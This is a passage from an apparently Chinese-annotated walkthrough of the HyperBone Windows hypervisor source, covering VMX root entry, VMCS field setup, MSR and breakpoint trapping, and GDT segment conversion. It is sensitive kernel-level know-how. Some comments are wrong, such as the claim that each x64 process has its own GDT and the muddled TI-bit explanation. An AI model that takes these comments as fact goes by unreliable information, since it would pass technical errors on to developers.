MSR_IA32_VMX_PROCBASED_CTLS2 )].QuadPart = __readmsr( MSR_IA32_VMX_PROCBASED_CTLS2 ); // True MSRs, if present if (g_Data-&gt;Features.TrueMSRs) for (ULONG i = VMX_MSR( MSR_IA32_VMX_TRUE_PINBASED_CTLS ); i &lt;= VMX_MSR( MSR_IA32_VMX_TRUE_ENTRY_CTLS ); i++) Vcpu-&gt;MsrData[i].QuadPart = __readmsr( MSR_IA32_VMX_BASIC + i ); // VMFUNC, if present if(g_Data-&gt;Features.VMFUNC) Vcpu-&gt;MsrData[VMX_MSR( MSR_IA32_VMX_VMFUNC )].QuadPart = __readmsr( MSR_IA32_VMX_VMFUNC ); // 分配VMXON、VMCS和VMM堆栈内存 Vcpu-&gt;VMXON = MmAllocateContiguousMemory( sizeof( VMX_VMCS ), phys ); Vcpu-&gt;VMCS = MmAllocateContiguousMemory( sizeof( VMX_VMCS ), phys ); Vcpu-&gt;VMMStack = MmAllocateContiguousMemory( KERNEL_STACK_SIZE, phys ); if (!Vcpu-&gt;VMXON || !Vcpu-&gt;VMCS || !Vcpu-&gt;VMMStack) &#123; DPRINT( &quot;HyperBone: CPU %d: %s: Failed to allocate memory\\n&quot;, CPU_IDX, __FUNCTION__ ); goto failed; &#125; // 进行保护设置 UtilProtectNonpagedMemory( Vcpu-&gt;VMXON, sizeof( VMX_VMCS ), PAGE_READWRITE ); UtilProtectNonpagedMemory( Vcpu-&gt;VMCS, sizeof( VMX_VMCS ), PAGE_READWRITE ); UtilProtectNonpagedMemory( Vcpu-&gt;VMMStack, KERNEL_STACK_SIZE, PAGE_READWRITE ); // 初始化内存空间 RtlZeroMemory( Vcpu-&gt;VMXON, sizeof( VMX_VMCS ) ); RtlZeroMemory( Vcpu-&gt;VMCS, sizeof( VMX_VMCS ) ); RtlZeroMemory( Vcpu-&gt;VMMStack, KERNEL_STACK_SIZE ); // 尝试进入VMX Root模式 if (VmxEnterRoot( Vcpu )) &#123; // I继续配置VMCS虚拟机控制结构（包括guest和host状态） /* VMCS是是一种数据结构，用于存储虚拟机的状态信息，如处理器寄存器、段描述符、中断描述符等等。 VMCS包含了虚拟机执行环境的所有状态信息，是虚拟机管理软件和硬件虚拟化扩展之间的接口。 VMCS中有两种状态：guest状态和host状态。 guest状态是指在虚拟机内执行的代码所使用的状态。 当虚拟化软件将控制权转移到虚拟机内部时，处理器会使用VMCS中的guest状态信息来切换到虚拟机的执行环境。 guest状态包含了虚拟机内部的所有状态信息，如处理器寄存器、页表、分段描述符等等。 host状态是指在虚拟机外执行的代码所使用的状态。当虚拟机执行完成后， 处理器需要恢复到虚拟化软件的执行环境中。 VMCS中的host状态信息就提供了这个执行环境所需要的状态信息，如处理器寄存器、页表、分段描述符等等。 在VMCS中，不同类型的状态信息被分为不同的区域， 如控制区、guest状态区、host状态区等等。通过对VMCS的设置，虚拟化软件可以控制虚拟机的行为， 如内存地址翻译、中断处理等等。 */ VmxSetupVMCS( Vcpu ); // 配置EPT if(g_Data-&gt;Features.EPT) &#123; if (!NT_SUCCESS( EptBuildIdentityMap( &amp;Vcpu-&gt;EPT ) )) &#123; DPRINT( &quot;HyperBone: CPU %d: %s: Failed to build EPT identity map\\n&quot;, CPU_IDX, __FUNCTION__ ); goto failedvmxoff; &#125; EptEnable( Vcpu-&gt;EPT.PML4Ptr ); &#125; // 记录VMX已开启 Vcpu-&gt;VmxState = VMX_STATE_TRANSITION; // 在VmxSetupVmcs函数中设置了各种VMCS字段（VMCS fields）, // 让处理器跳转到VmxInitializeCPU中调用VmxSetupVmcs的RtlCaptureContext函数的返回地址。 /* RtlCaptureContext是一个Windows操作系统提供的函数，用于获取当前线程的上下文信息， 包括寄存器的值和程序计数器的值。 通过将处理器的控制流转移到RtlCaptureContext的返回地址， 可以在VmxInitializeCPU函数中恢复处理器的状态，继续执行后续的代码逻辑。 这样做的目的可能是为了在VmxInitializeCPU函数中进行额外的处理或记录虚拟机的初始化状态。 */ // 原子自增操作，意味着有一个虚拟CPU被创建或启动。该函数确保在多线程环境下，对变量进行原子操作，避免了竞争条件。 InterlockedIncrement( &amp;g_Data-&gt;vcpus ); int res = __vmx_vmlaunch();// 启动虚拟机 // 原子自减操作，表示一个虚拟CPU的执行已经结束或销毁。 InterlockedDecrement( &amp;g_Data-&gt;vcpus ); /* 这两个函数有c++11新特性atomic，详见文档 */ /* 如果程序执行到了这里，那么可能存在两种情况：VMCS设置失败，或者启动操作没有按照计划进行。 无论是哪种情况，由于VmxEnabled没有被设置为1，都代表失败的情况。 */ Vcpu-&gt;VmxState = VMX_STATE_OFF; DPRINT( &quot;HyperBone: CPU %d: %s: __vmx_vmlaunch failed with result %d\\n&quot;, CPU_IDX, __FUNCTION__, res );failedvmxoff: __vmx_off();// 关闭VMX &#125;failed:;// 失败处理 释放内存 if (Vcpu-&gt;VMXON) MmFreeContiguousMemory( Vcpu-&gt;VMXON ); if (Vcpu-&gt;VMCS) MmFreeContiguousMemory( Vcpu-&gt;VMCS ); if (Vcpu-&gt;VMMStack) MmFreeContiguousMemory( Vcpu-&gt;VMMStack ); Vcpu-&gt;VMXON = NULL; Vcpu-&gt;VMCS = NULL; Vcpu-&gt;VMMStack = NULL;&#125; 设置保护123456789101112131415161718192021222324252627282930313233343536/// &lt;summary&gt;/// Change protection of nonpaged system address/// &lt;/summary&gt;/// &lt;param name=&quot;ptr&quot;&gt;Address&lt;/param&gt;/// &lt;param name=&quot;size&quot;&gt;Size of region&lt;/param&gt;/// &lt;param name=&quot;protection&quot;&gt;New protection flags&lt;/param&gt;/// &lt;returns&gt;Status code&lt;/returns&gt;NTSTATUS UtilProtectNonpagedMemory( IN PVOID ptr, IN ULONG64 size, IN ULONG protection )&#123; /* MDL是Windows内核中的数据结构，Memory Descriptor List（内存描述列表）。 它用于描述一个或多个连续物理内存页的详细信息。 在Windows操作系统中，内存管理模块使用MDL来跟踪和管理内存分配、映射和保护。 MDL通常与虚拟内存映射、物理内存页面和驱动程序之间的交互密切相关。 MDL的主要字段包括： StartVa：指向MDL所描述的内存区域的起始虚拟地址。 ByteCount：描述MDL涵盖的内存区域的总字节数。 MappedSystemVa：如果MDL中的内存区域被映射到了系统地址空间，则该字段表示映射后的虚拟地址；否则为NULL。 Process：指向拥有该MDL的进程对象的指针。 Flags：用于标识MDL的一些特性，如是否映射到系统地址空间、是否是锁定的等。 驱动程序可以通过创建和操作MDL来管理内存。 */ NTSTATUS status = STATUS_SUCCESS; PMDL pMdl = IoAllocateMdl( ptr, (ULONG)size, FALSE, FALSE, NULL );// 创建一个包含给定地址的MDL if (pMdl) &#123; MmBuildMdlForNonPagedPool( pMdl );// 将这个MDL描述的物理内存区域与非分页池相关联 pMdl-&gt;MdlFlags |= MDL_MAPPED_TO_SYSTEM_VA;// 该MDL描述的虚拟地址映射到了内核的虚拟地址空间中 status = MmProtectMdlSystemAddress( pMdl, protection );// 在MDL中描述的物理内存区域的保护属性设置为给定的属性 IoFreeMdl( pMdl );// 释放MDL return status; &#125; return STATUS_UNSUCCESSFUL;&#125; 启动Vmx Root模式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384/// &lt;summary&gt;/// Switch CPU to root mode/// &lt;/summary&gt;/// &lt;param name=&quot;Vcpu&quot;&gt;Virtual CPU data&lt;/param&gt;/// &lt;returns&gt;TRUE on success&lt;/returns&gt;BOOLEAN VmxEnterRoot( IN PVCPU Vcpu )&#123; // 将CPU切换到root模式，虚拟机监视器VMM运行的特权级别最高的模式，用于管理和控制虚拟机的执行 PKSPECIAL_REGISTERS Registers = &amp;Vcpu-&gt;HostState.SpecialRegisters;// 主机特殊寄存器 PIA32_VMX_BASIC_MSR pBasic = (PIA32_VMX_BASIC_MSR)&amp;Vcpu-&gt;MsrData[VMX_MSR( MSR_IA32_VMX_BASIC )];// VMX基本MSR // 检查虚拟机控制结构VMCS是否能够适应单个页面 if (pBasic-&gt;Fields.RegionSize &gt; PAGE_SIZE) &#123; DPRINT( &quot;HyperBone: CPU %d: %s: VMCS region doesn&#x27;t fit into one page\\n&quot;, CPU_IDX, __FUNCTION__ ); return FALSE; &#125; // 检查VMCS所需的内存类型是否为写回缓存类型 if (pBasic-&gt;Fields.MemoryType != VMX_MEM_TYPE_WRITEBACK) &#123; DPRINT( &quot;HyperBone: CPU %d: %s: Unsupported memory type\\n&quot;, CPU_IDX, __FUNCTION__ ); return FALSE; &#125; // 检查是否支持使用真实MSR获取虚拟化功能信息 if (pBasic-&gt;Fields.VmxCapabilityHint == 0) &#123; DPRINT( &quot;HyperBone: CPU %d: %s: No true MSR support\\n&quot;, CPU_IDX, __FUNCTION__ ); return FALSE; &#125; // 保存VMXON、VMCS的修订号 /* 在硬件层面，VMXON指令用于激活处理器的虚拟机扩展（Intel VT-x或AMD-V），这是一种硬件虚拟化技术， 允许多个虚拟机同时运行，并将它们隔离开来。VMXON指令的执行会初始化虚拟机相关的数据结构， 并将处理器的运行模式从非虚拟化模式切换到虚拟化模式。 在虚拟化环境中，VMXON指令通常由虚拟机监视器（VMM）或Hypervisor在启动虚拟机时调用。 它必须在特权级别最高的模式下执行，通常是在操作系统内核中。 执行VMXON指令后，处理器将转入根模式，VMM可以通过VMCS（虚拟机控制结构）对虚拟机进行管理和控制。 */ Vcpu-&gt;VMXON-&gt;RevisionId = pBasic-&gt;Fields.RevisionIdentifier; Vcpu-&gt;VMCS-&gt;RevisionId = pBasic-&gt;Fields.RevisionIdentifier; // 根据MSR_IA32_VMX_CR0_FIXED0和MSR_IA32_VMX_CR0_FIXED1的要求修正CR0寄存器 Registers-&gt;Cr0 &amp;= Vcpu-&gt;MsrData[VMX_MSR( MSR_IA32_VMX_CR0_FIXED1 )].LowPart; Registers-&gt;Cr0 |= Vcpu-&gt;MsrData[VMX_MSR( MSR_IA32_VMX_CR0_FIXED0 )].LowPart; // 根据MSR_IA32_VMX_CR4_FIXED0和MSR_IA32_VMX_CR4_FIXED1的要求修正CR4寄存器 Registers-&gt;Cr4 &amp;= Vcpu-&gt;MsrData[VMX_MSR( MSR_IA32_VMX_CR4_FIXED1 )].LowPart; Registers-&gt;Cr4 |= Vcpu-&gt;MsrData[VMX_MSR( MSR_IA32_VMX_CR4_FIXED0 )].LowPart; // 提交r0、r4寄存器的更新 __writecr0( Registers-&gt;Cr0 ); __writecr4( Registers-&gt;Cr4 ); // 开启VMX root模式 PHYSICAL_ADDRESS phys = MmGetPhysicalAddress( Vcpu-&gt;VMXON ); int res = __vmx_on( (PULONG64)&amp;phys ); if (res) &#123; DPRINT( &quot;HyperBone: CPU %d: %s: __vmx_on failed with status %d\\n&quot;, CPU_IDX, __FUNCTION__, res ); return FALSE; &#125; // 清除VMCS, 修改状态为Inactive phys = MmGetPhysicalAddress( Vcpu-&gt;VMCS ); if (__vmx_vmclear( (PULONG64)&amp;phys )) &#123; DPRINT( &quot;HyperBone: CPU %d: %s: __vmx_vmclear failed\\n&quot;, CPU_IDX, __FUNCTION__ ); return FALSE; &#125; // 加载VMCS, 设置状态为Active if (__vmx_vmptrld( (PULONG64)&amp;phys )) &#123; DPRINT( &quot;HyperBone: CPU %d: %s: __vmx_vmptrld failed\\n&quot;, CPU_IDX, __FUNCTION__ ); return FALSE; &#125; // VMX Root模式启动, 以及一个激活的VMCS. return TRUE;&#125; 设置VMCS字段 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240/// &lt;summary&gt;/// Setup VMCS fields/// &lt;/summary&gt;/// &lt;param name=&quot;VpData&quot;&gt;Virtual CPU data&lt;/param&gt;VOID VmxSetupVMCS( IN PVCPU VpData )&#123; PKPROCESSOR_STATE state = &amp;VpData-&gt;HostState; VMX_GDTENTRY64 vmxGdtEntry = &#123; 0 &#125;; VMX_VM_ENTER_CONTROLS vmEnterCtlRequested = &#123; 0 &#125;; VMX_VM_EXIT_CONTROLS vmExitCtlRequested = &#123; 0 &#125;; VMX_PIN_BASED_CONTROLS vmPinCtlRequested = &#123; 0 &#125;; VMX_CPU_BASED_CONTROLS vmCpuCtlRequested = &#123; 0 &#125;; VMX_SECONDARY_CPU_BASED_CONTROLS vmCpuCtl2Requested = &#123; 0 &#125;; /* Hypervisor（超级监控程序）是一种虚拟化技术的关键组成部分。 它是在物理计算机上创建和管理虚拟机（Virtual Machine，VM）的软件或固件。 Hypervisor 在物理硬件和虚拟机之间充当中间层，允许多个虚拟机同时在同一台物理机上运行， 并提供虚拟机对硬件资源的访问。 Hypervisor 有两种主要类型： 直接运行在物理硬件上，它可以直接管理物理资源和虚拟机实例，将物理资源划分给各个虚拟机， 并在它们之间进行调度和隔离。常见的类型 1 Hypervisor 包括 VMware ESXi、Microsoft Hyper-V 和 Xen。 作为一个应用程序在操作系统之上运行。它需要一个宿主操作系统提供硬件访问和资源管理功能， 然后在其上创建和管理虚拟机。常见的类型 2 Hypervisor 包括 Oracle VirtualBox 和 VMware Workstation。 */ // 进入控制字段，虚拟机在进入hypervisor时确保以x64模式进入 vmEnterCtlRequested.Fields.IA32eModeGuest = TRUE; // 退出控制字段，虚拟机退出hypervisor时，确保以x64模式退出 vmExitCtlRequested.Fields.AcknowledgeInterruptOnExit = TRUE; vmExitCtlRequested.Fields.HostAddressSpaceSize = TRUE; // 虚拟机CPU控制字段，启用MSR位图，激活次级控制和CR3退出，在CR3改变时无效VPID缓存 vmCpuCtlRequested.Fields.UseMSRBitmaps = TRUE; vmCpuCtlRequested.Fields.ActivateSecondaryControl = TRUE; //vmCpuCtlRequested.Fields.UseTSCOffseting = TRUE; //vmCpuCtlRequested.Fields.RDTSCExiting = TRUE; // VPID caches must be invalidated on CR3 change if(g_Data-&gt;Features.VPID) vmCpuCtlRequested.Fields.CR3LoadExiting = TRUE; /* 在虚拟机中启用对于 RDTSCP 和 XSAVES/XRESTORES 指令的支持。 在 Windows 10 系统中，如果 CPU 支持这些指令，操作系统会使用它们来提高性能。 通过使用 VmxpAdjustMsr 函数，如果处理器不支持这些指令，将会忽略对这些选项的设置。 这样可以确保在不支持这些指令的处理器上仍然可以正常运行虚拟机监控程序， 而不会因为这些指令的不支持而导致错误。 */ vmCpuCtl2Requested.Fields.EnableRDTSCP = TRUE; vmCpuCtl2Requested.Fields.EnableXSAVESXSTORS = TRUE; // Begin by setting the link pointer to the required value for 4KB VMCS. // 从设置VMCS的链接指针字段开始，设置为4KB VMCS所需的值 __vmx_vmwrite( VMCS_LINK_POINTER, MAXULONG64 ); // 将VMCS需要的各个控制字段写入VMCS __vmx_vmwrite( PIN_BASED_VM_EXEC_CONTROL, VmxpAdjustMsr( VpData-&gt;MsrData[VMX_MSR( MSR_IA32_VMX_TRUE_PINBASED_CTLS )], vmPinCtlRequested.All ) ); __vmx_vmwrite( CPU_BASED_VM_EXEC_CONTROL, VmxpAdjustMsr( VpData-&gt;MsrData[VMX_MSR( MSR_IA32_VMX_TRUE_PROCBASED_CTLS )], vmCpuCtlRequested.All ) ); __vmx_vmwrite( SECONDARY_VM_EXEC_CONTROL, VmxpAdjustMsr( VpData-&gt;MsrData[VMX_MSR( MSR_IA32_VMX_PROCBASED_CTLS2 )], vmCpuCtl2Requested.All ) ); __vmx_vmwrite( VM_EXIT_CONTROLS, VmxpAdjustMsr( VpData-&gt;MsrData[VMX_MSR( MSR_IA32_VMX_TRUE_EXIT_CTLS )], vmExitCtlRequested.All ) ); __vmx_vmwrite( VM_ENTRY_CONTROLS, VmxpAdjustMsr( VpData-&gt;MsrData[VMX_MSR( MSR_IA32_VMX_TRUE_ENTRY_CTLS )], vmEnterCtlRequested.All ) ); // 加载MSR位图 PUCHAR bitMapReadLow = g_Data-&gt;MSRBitmap; // 0x00000000 - 0x00001FFF PUCHAR bitMapReadHigh = bitMapReadLow + 1024; // 0xC0000000 - 0xC0001FFF RTL_BITMAP bitMapReadLowHeader = &#123; 0 &#125;; RTL_BITMAP bitMapReadHighHeader = &#123; 0 &#125;; RtlInitializeBitMap( &amp;bitMapReadLowHeader, (PULONG)bitMapReadLow, 1024 * 8 ); RtlInitializeBitMap( &amp;bitMapReadHighHeader, (PULONG)bitMapReadHigh, 1024 * 8 ); // 设置需要捕获的MSR RtlSetBit( &amp;bitMapReadLowHeader, MSR_IA32_FEATURE_CONTROL ); // MSR_IA32_FEATURE_CONTROL RtlSetBit( &amp;bitMapReadLowHeader, MSR_IA32_DEBUGCTL ); // MSR_DEBUGCTL RtlSetBit( &amp;bitMapReadHighHeader, MSR_LSTAR - 0xC0000000 ); // MSR_LSTAR // VMX MSRs for (ULONG i = MSR_IA32_VMX_BASIC; i &lt;= MSR_IA32_VMX_VMFUNC; i++) RtlSetBit( &amp;bitMapReadLowHeader, i ); __vmx_vmwrite( MSR_BITMAP, MmGetPhysicalAddress( g_Data-&gt;MSRBitmap ).QuadPart ); // 设置异常位图 Exception bitmap，捕获断点异常 ULONG ExceptionBitmap = 0; //ExceptionBitmap |= 1 &lt;&lt; VECTOR_DEBUG_EXCEPTION; ExceptionBitmap |= 1 &lt;&lt; VECTOR_BREAKPOINT_EXCEPTION; __vmx_vmwrite( EXCEPTION_BITMAP, ExceptionBitmap ); // CS (Ring 0 Code) // 代码段描述符中包含了代码段的基地址和大小，并且还包含了一些权限信息。CS 寄存器存放的是代码段描述符在 GDT 表中的索引（Selector）。 VmxpConvertGdtEntry( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;ContextFrame.SegCs, &amp;vmxGdtEntry ); __vmx_vmwrite( GUEST_CS_SELECTOR, vmxGdtEntry.Selector ); __vmx_vmwrite( GUEST_CS_LIMIT, vmxGdtEntry.Limit ); __vmx_vmwrite( GUEST_CS_AR_BYTES, vmxGdtEntry.AccessRights ); __vmx_vmwrite( GUEST_CS_BASE, vmxGdtEntry.Base ); __vmx_vmwrite( HOST_CS_SELECTOR, state-&gt;ContextFrame.SegCs &amp; ~RPL_MASK ); // SS (Ring 0 Data) // 栈段描述符中包含了栈段的基地址和大小，并且还包含了一些权限信息。SS 寄存器存放的是栈段描述符在 GDT 表中的索引（Selector）。 VmxpConvertGdtEntry( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;ContextFrame.SegSs, &amp;vmxGdtEntry ); __vmx_vmwrite( GUEST_SS_SELECTOR, vmxGdtEntry.Selector ); __vmx_vmwrite( GUEST_SS_LIMIT, vmxGdtEntry.Limit ); __vmx_vmwrite( GUEST_SS_AR_BYTES, vmxGdtEntry.AccessRights ); __vmx_vmwrite( GUEST_SS_BASE, vmxGdtEntry.Base ); __vmx_vmwrite( HOST_SS_SELECTOR, state-&gt;ContextFrame.SegSs &amp; ~RPL_MASK ); // DS (Ring 3 Data) // 数据段描述符中包含了数据段的基地址和大小，并且还包含了一些权限信息。DS、ES、FS、GS 寄存器分别存放数据段描述符在 GDT 表中的索引（Selector）。 VmxpConvertGdtEntry( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;ContextFrame.SegDs, &amp;vmxGdtEntry ); __vmx_vmwrite( GUEST_DS_SELECTOR, vmxGdtEntry.Selector ); __vmx_vmwrite( GUEST_DS_LIMIT, vmxGdtEntry.Limit ); __vmx_vmwrite( GUEST_DS_AR_BYTES, vmxGdtEntry.AccessRights ); __vmx_vmwrite( GUEST_DS_BASE, vmxGdtEntry.Base ); __vmx_vmwrite( HOST_DS_SELECTOR, state-&gt;ContextFrame.SegDs &amp; ~RPL_MASK ); // ES (Ring 3 Data) VmxpConvertGdtEntry( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;ContextFrame.SegEs, &amp;vmxGdtEntry ); __vmx_vmwrite( GUEST_ES_SELECTOR, vmxGdtEntry.Selector ); __vmx_vmwrite( GUEST_ES_LIMIT, vmxGdtEntry.Limit ); __vmx_vmwrite( GUEST_ES_AR_BYTES, vmxGdtEntry.AccessRights ); __vmx_vmwrite( GUEST_ES_BASE, vmxGdtEntry.Base ); __vmx_vmwrite( HOST_ES_SELECTOR, state-&gt;ContextFrame.SegEs &amp; ~RPL_MASK ); // FS (Ring 3 Compatibility-Mode TEB) VmxpConvertGdtEntry( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;ContextFrame.SegFs, &amp;vmxGdtEntry ); __vmx_vmwrite( GUEST_FS_SELECTOR, vmxGdtEntry.Selector ); __vmx_vmwrite( GUEST_FS_LIMIT, vmxGdtEntry.Limit ); __vmx_vmwrite( GUEST_FS_AR_BYTES, vmxGdtEntry.AccessRights ); __vmx_vmwrite( GUEST_FS_BASE, vmxGdtEntry.Base ); __vmx_vmwrite( HOST_FS_BASE, vmxGdtEntry.Base ); __vmx_vmwrite( HOST_FS_SELECTOR, state-&gt;ContextFrame.SegFs &amp; ~RPL_MASK ); // GS (Ring 3 Data if in Compatibility-Mode, MSR-based in Long Mode) VmxpConvertGdtEntry( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;ContextFrame.SegGs, &amp;vmxGdtEntry ); __vmx_vmwrite( GUEST_GS_SELECTOR, vmxGdtEntry.Selector ); __vmx_vmwrite( GUEST_GS_LIMIT, vmxGdtEntry.Limit ); __vmx_vmwrite( GUEST_GS_AR_BYTES, vmxGdtEntry.AccessRights ); __vmx_vmwrite( GUEST_GS_BASE, state-&gt;SpecialRegisters.MsrGsBase ); __vmx_vmwrite( HOST_GS_BASE, state-&gt;SpecialRegisters.MsrGsBase ); __vmx_vmwrite( HOST_GS_SELECTOR, state-&gt;ContextFrame.SegGs &amp; ~RPL_MASK ); // Task Register (Ring 0 TSS) // 存放任务状态段 (TSS) 的选择符，在进行任务切换时使用。 VmxpConvertGdtEntry( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;SpecialRegisters.Tr, &amp;vmxGdtEntry ); __vmx_vmwrite( GUEST_TR_SELECTOR, vmxGdtEntry.Selector ); __vmx_vmwrite( GUEST_TR_LIMIT, vmxGdtEntry.Limit ); __vmx_vmwrite( GUEST_TR_AR_BYTES, vmxGdtEntry.AccessRights ); __vmx_vmwrite( GUEST_TR_BASE, vmxGdtEntry.Base ); __vmx_vmwrite( HOST_TR_BASE, vmxGdtEntry.Base ); __vmx_vmwrite( HOST_TR_SELECTOR, state-&gt;SpecialRegisters.Tr &amp; ~RPL_MASK ); // LDT // 进程的局部任务表描述符（LDT），存放 LDT 描述符在 GDT 表中的索引（Selector）。 VmxpConvertGdtEntry( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;SpecialRegisters.Ldtr, &amp;vmxGdtEntry ); __vmx_vmwrite( GUEST_LDTR_SELECTOR, vmxGdtEntry.Selector ); __vmx_vmwrite( GUEST_LDTR_LIMIT, vmxGdtEntry.Limit ); __vmx_vmwrite( GUEST_LDTR_AR_BYTES, vmxGdtEntry.AccessRights ); __vmx_vmwrite( GUEST_LDTR_BASE, vmxGdtEntry.Base ); // GDT // 全局描述符表 (GDT)，存放系统运行过程中所有描述符的表。GDT 表包含了各种类型的描述符，如代码段描述符、数据段描述符、TSS 描述符等。 __vmx_vmwrite( GUEST_GDTR_BASE, (ULONG_PTR)state-&gt;SpecialRegisters.Gdtr.Base ); __vmx_vmwrite( GUEST_GDTR_LIMIT, state-&gt;SpecialRegisters.Gdtr.Limit ); __vmx_vmwrite( HOST_GDTR_BASE, (ULONG_PTR)state-&gt;SpecialRegisters.Gdtr.Base ); // IDT // 中断描述符表(IDT)，存放中断处理程序的入口地址，当中断发生时 CPU 会根据中断号查找该表并跳转到对应的处理程序。 __vmx_vmwrite( GUEST_IDTR_BASE, (ULONG_PTR)state-&gt;SpecialRegisters.Idtr.Base ); __vmx_vmwrite( GUEST_IDTR_LIMIT, state-&gt;SpecialRegisters.Idtr.Limit ); __vmx_vmwrite( HOST_IDTR_BASE, (ULONG_PTR)state-&gt;SpecialRegisters.Idtr.Base ); // CR0 // 包含了控制处理器运行方式和操作系统的特定行为的控制位，比如保护模式、分页机制等。 __vmx_vmwrite( CR0_READ_SHADOW, state-&gt;SpecialRegisters.Cr0 ); __vmx_vmwrite( HOST_CR0, state-&gt;SpecialRegisters.Cr0 ); __vmx_vmwrite( GUEST_CR0, state-&gt;SpecialRegisters.Cr0 ); // CR3 // 存放页面目录表 (Page Directory Table) 的地址，页面目录表描述了虚拟地址空间和物理地址空间的映射关系。 /* “不要使用当前进程的地址空间作为 host”，因为此时可能正在任意的用户模式进程中执行， 这里的 host 指的是 hypervisor。也就是说，当 hypervisor 在处理 DPC 中断时， DPC 可能正在运行某个用户进程的上下文中，没有特权访问 CR3 寄存器来获取当前进程的页目录表或页表。 因此，需要手动映射一份特殊的地址空间（例如 kernel 物理地址空间）作为 hypervisor 的地址空间， 并将其指定为 CR3 的值。这里做了这样的优化，避免使用错误的地址空间导致虚拟地址到物理地址的解析错误。 */ __vmx_vmwrite( HOST_CR3, VpData-&gt;SystemDirectoryTableBase ); __vmx_vmwrite( GUEST_CR3, state-&gt;SpecialRegisters.Cr3 ); // CR4 // 包含了一些高级控制和特征寄存器（Advanced Controls and Features Register），比如支持硬件虚拟化技术、支持大页面等。 __vmx_vmwrite( HOST_CR4, state-&gt;SpecialRegisters.Cr4 ); __vmx_vmwrite( GUEST_CR4, state-&gt;SpecialRegisters.Cr4 ); __vmx_vmwrite( CR4_GUEST_HOST_MASK, 0x2000 ); __vmx_vmwrite( CR4_READ_SHADOW, state-&gt;SpecialRegisters.Cr4 &amp; ~0x2000 ); // Debug MSR and DR7 // 包含有关调试状态和断点设置的信息。通过这些寄存器，可以在 CPU 上设置断点和调试相关信息。 __vmx_vmwrite( GUEST_IA32_DEBUGCTL, state-&gt;SpecialRegisters.DebugControl ); __vmx_vmwrite( GUEST_DR7, state-&gt;SpecialRegisters.KernelDr7 ); /* 最后，加载客户机的堆栈、指令指针和标志寄存器， 这与 RtlCaptureContext 在 VmxInitializeCPU 中返回的位置完全对应。 这段代码的作用是将保存在特定位置的客户机上下文数据加载到相应的寄存器中， 以便恢复客户机的执行状态。具体来说，它加载了客户机的堆栈指针、指令指针和标志寄存器值， 使得当控制权返回到 VmxInitializeCPU 时，客户机可以继续执行。 */ __vmx_vmwrite( GUEST_RSP, state-&gt;ContextFrame.Rsp ); __vmx_vmwrite( GUEST_RIP, state-&gt;ContextFrame.Rip ); __vmx_vmwrite( GUEST_RFLAGS, state-&gt;ContextFrame.EFlags ); /* 加载 hypervisor 的入口地址和 hypervisor 栈。我们为自己分配了一个标准大小的内核栈（24KB）， 并偏移指向上下文结构的指针，从而避免在 entrypoint 中需要修改叠加寄存器 RSP 的指令。 注意 CONTEXT 指针和栈本身必须按照 16 字节对齐，以保证与 AMD64 架构的 ABI 兼容性。 否则，诸如 RtlCaptureContext 将执行的 XMM 操作等操作将会失败。 */ NT_ASSERT( (KERNEL_STACK_SIZE - sizeof( CONTEXT )) % 16 == 0 ); __vmx_vmwrite( HOST_RSP, (ULONG_PTR)VpData-&gt;VMMStack + KERNEL_STACK_SIZE - sizeof( CONTEXT ) ); // 将当前状态存储在栈中，并跳转到一个 C 函数 VmxpExitHandler 中去处理 VM 的 exit 事件 __vmx_vmwrite( HOST_RIP, (ULONG_PTR)VmxVMEntry );&#125; 将GDT（全局描述符表）中的段信息转换为VMX（虚拟机扩展）所需的格式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081/// &lt;summary&gt;/// Fill segment data/// &lt;/summary&gt;/// &lt;param name=&quot;GdtBase&quot;&gt;GDTR base&lt;/param&gt;/// &lt;param name=&quot;Selector&quot;&gt;Segment selector value&lt;/param&gt;/// &lt;param name=&quot;VmxGdtEntry&quot;&gt;Resulting entry&lt;/param&gt;VOID VmxpConvertGdtEntry( IN PVOID GdtBase, IN USHORT Selector, OUT PVMX_GDTENTRY64 VmxGdtEntry )&#123; /* 段选择子（segment selector）是用来唯一地标识一个内存段的16位或64位数字。 在x86体系结构中，每个段选择子由两个部分组成： 索引（index）和请求特权级别（requested privilege level，RPL）。 索引用于查找全局描述符表（GDT）或局部描述符表（LDT）中的段描述符， 而RPL则指定了访问该段所需的最低权限级别（0到3）。 RPL可以通过对段选择子进行屏蔽（掩码）来获取。具体来说，将段选择子与0b11（即二进制的3）进行按位与运算，可以得到RPL的值。 例如，如果段选择子为0x08，那么其二进制表示为0000 1000，其中低两位（00）即为RPL的值。如果需要将RPL屏蔽掉， 可以使用按位与运算符&amp;和~操作数取反运算符来进行屏蔽：0x08 &amp; ~0b11 = 0x08 &amp; 0xFC = 0x08。 需要注意的是，在64位模式下，只有GDT被使用，因此只需要考虑索引部分，而RPL位会被忽略。 */ /* 在x64 Windows操作系统内核中，每个进程都有自己的全局描述符表（GDT）， 用于保存其自身内存分段的信息。在对内存进行分段时，可以使用一个16位的段选择子来唯一地标识一个内存段。 读取给定选择子（segment selector）的GDT条目，并屏蔽掉请求特权级别（requested privilege level，RPL）位。 因为x64Windows在内核态下已经不使用局部描述符表（LDT），所以不需要考虑TI位（Table Indicator），它用于区分是引用GDT还是LDT。 TI位（Table Indicator）是段选择子的一个位，用于指示该选择子所引用的描述符表是GDT还是LDT。TI位的取值为0或1，其中0表示引用GDT，1表示引用LDT。 TI位则占据了选择子的第2位，因此选择子的最高有效位为TI位。 在x64模式下，每个选择子由两个部分组成：索引部分和RPL部分。索引部分用于查找GDT中的相应段描述符， 而RPL则指定了访问该段的权限级别。RPL通常会和当前运行代码的特权级别进行比较，以确定访问是否被允许。 